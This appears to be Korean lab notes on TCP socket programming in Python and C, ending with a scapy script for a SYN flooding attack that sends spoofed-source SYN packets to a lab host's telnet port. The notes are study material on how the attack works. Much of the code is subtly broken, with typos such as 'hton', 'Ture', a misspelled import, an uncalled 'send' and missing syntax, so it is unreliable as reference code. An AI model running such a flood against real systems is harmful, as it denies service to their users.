# (1) Python으로 작성한 TCP
## TCP 클라이언트 프로그램
- 요청을 받는 서버는 9090으로 기다리고 있다는 전제(nc -lnv 9090)
```python
#!/bin/env python3
import socket

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.connect(('10.0.2.69', 9090))

tcp.sendall(b"Hello Server!\n")
tcp.sendall(b"Hello Again!\n")

tcp.close
```
## TCP 서버 프로그램
- 클라이언트에서 받은 데이터를 출력하는 TCP 서버
```python
#!/bin/env python3
import socket

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.bind(("0.0.0.0",9090))
tcp.listen()

conn, addr = tcp.accept()
with conn:
	print('Connected by', addr)
	while True :
		data = conn.recv(1024)
		if not data :
			break
		print(data)
		conn.sendall(b"Got the data!\n")
```
# (2) C로 TCP 프로그램 작성
- Python code로 작성될 경우, TCP 동작 방식을 이해하는데 몇 가지 기술적인 세부사항이 숨겨짐
## TCP 클라이언트 프로그램
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main() {
	// 1. Create a socket / TCP는 소켓  통신 유형을 SOCK_STREAM
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// 2. Set the destination information
	struct sockaddr_in dest;
	memset(&dest, 0, sizeof(struct sockaddr_in));
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = inet_addr("10.0.2.69");
	dest.sin_port = htons(9090);
	
	// 3. Connect to the server => TCP 3 way handshake protocol이 포함
	connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr_in));
	
	// 4. Send data to the server
	char *buffer1 = "Hello Server!\n";
	char *buffer2 = "Hello Agin!\n";
	write(sockfd, buffer1, strlen(buffer1));
	write(sockfd, buffer2, strlen(buffer2));
	// 연결이 설정되면 연결의 양쪽 종단은 write(), send(), sendto(), sendmsg()와 같은 시스템 호출을 사용하여 서로 데이터를 보낼 수 있음
	// 또한, read(), recv(), recvfrom(), recvmsg()를 통해 다른 쪽에서 보낸 데이터를 가져올 수도 있음
	
	// 5. Close the connection
	close(sockfd);
	return 0;
}
```
## TCP 서버 프로그램
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main() {
	int sockfd, newsockfd;
	struct sockaddr_in my_addr, client_addr;
	char buffer[100];
	
	// 1. Create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// 2. Bind to a port number
	memset(&my_addr, 0, sizeof(struct sockaddr_in));
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = hton(9090);
	bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr_in));
	
	// 3. Listen for connections
	listen(sockfd, 5);
	// listen() 시스템 호출의 두번째 인수 : 큐의 제한(큐에 저장할 수 있는 보류 중인 연결 수를 지정)
	
	// 4. Accept a connection request
	int client_len = sizeof(client_addr);
	newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
	// 연결은 되었지만 아직 응용 프로그램에서 사용할 수 X => 연결에 액세스하기 전에 연결을 구체적으로 수락(accept)해야 함
	// => 큐에서 첫번째 연결 요청을 추출하고 새로운 소켓을 만들고 해당 소켓을 참조하는 새로운 파일 설명자를 반환하는 accept() 시스템 호출이 사용됨
	// --> 연결이 수락되면 새로운 소켓이 만들어지고, 응용 프로그램이 새로운 소켓을 통해 이 연결에 액세스 가능
	
	// 5. Read data from the connection
	memset(buffer, 0, sizeof(buffer));
	int len = read(newsockfd, buffer, 100);
	printf("Received %d bytes: %s", len, buffer);
	
	// 6. Close the connection
	close(newsockfd);
	close(sockfd);
	
	return 0;
}
```
## 다중 연결 수락하는 TCP 서버
- 연결이 수락되면 새로운 프로세스를 포크(fork)하고 자식(child) 프로세스를 사용하여 연결을 처리
	- 부모(Parent) 프로세스가 해제되어 다른 보류 중인 연결 요청을 처리하기 위해 accept() 호출로 루프백
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main() {
	int sockfd, newsockfd;
	struct sockaddr_in my_addr, client_addr;
	char buffer[100];
	
	// 1. Create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// 2. Bind to a port number
	memset(&my_addr, 0, sizeof(struct sockaddr_in));
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = hton(9090);
	bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr_in));
	
	// 3. Listen for connections
	listen(sockfd, 5);
	
	int client_len = sizeof(client_addr);
	while (1) {
		newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
		if (fork() == 0) { // The child process
		// fock() 시스템 호출은 호출 프로세스를 복제하여 새로운 프로세스를 생성
		// => 성공하면 자신 프로세스의 프로세스 ID가 부모 프로세스에서 반환되고 자식 프로세스에서는 0이 반환된다.
			close (sockfd);
			
			// Read data
			memset(buffer, 0, sizeof(buffer));
			int len = read(newsockfd, buffer, 100);
			printf("Received %d bytes.\n%s\n", len, buffer);
			
			close (newsockfd);
			return 0;
		} else { // parent process
			close (newsockfd)
		}
	}
```

# (3) SYN 플러딩 공격
## Python 프로그램(synflood.py)
```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbite

ip = IP(dst="10.0.2.69")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while Ture:
	pkt[IP].src = str(IPv4Address(getrandbites(32)))
	pkt[TCP].sport = getrandbites(16)
	pkt[TCP].seq = getrandbites(32)
	send
```